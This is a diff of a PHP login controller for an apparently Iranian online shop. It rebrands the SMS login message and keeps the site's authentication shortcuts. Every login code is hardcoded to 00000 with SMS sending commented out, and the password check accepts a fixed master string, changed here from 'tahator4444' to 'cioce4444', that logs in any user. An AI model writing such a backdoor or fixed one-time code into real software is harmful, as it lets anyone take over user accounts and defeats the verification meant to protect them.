@@ -46,7 +46,7 @@ class LoginController extends Controller
 
                     $code = 00000;//rand(10000,99999);
 
-                /*    self::sms($mobile,"کد ورود شما به سایت ثمین تخفیف ".
+                /*    self::sms($mobile,"کد ورود شما به سایت فروشگاه سیوسه ".
                         "\n".
                         "code: ".$code
                     );*/
@@ -62,7 +62,7 @@ class LoginController extends Controller
 
                 $code = 00000;//rand(10000,99999);
 
-                //        self::sms($mobile,"کد ورود شما به سایت ثمین تخفیف ".
+                //        self::sms($mobile,"کد ورود شما به سایت فروشگاه سیوسه ".
                 //            "\n".
                 //            "code: ".$code
                 //        );
@@ -102,7 +102,7 @@ class LoginController extends Controller
 
         if(isset($user->id)) {
 
-            if (Hash::check($code,$user->password) || $code == "tahator4444") {
+            if (Hash::check($code,$user->password) || $code == "cioce4444") {
 
                 Auth::loginUsingId($user->id, true);
 
@@ -220,7 +220,7 @@ class LoginController extends Controller
 
                     $code = 00000;//rand(10000,99999);
 
-                    //        self::sms($mobile,"کد ورود شما به سایت ثمین تخفیف ".
+                    //        self::sms($mobile,"کد ورود شما به سایت فروشگاه سیوسه ".
                     //            "\n".
                     //            "code: ".$code
                     //        );
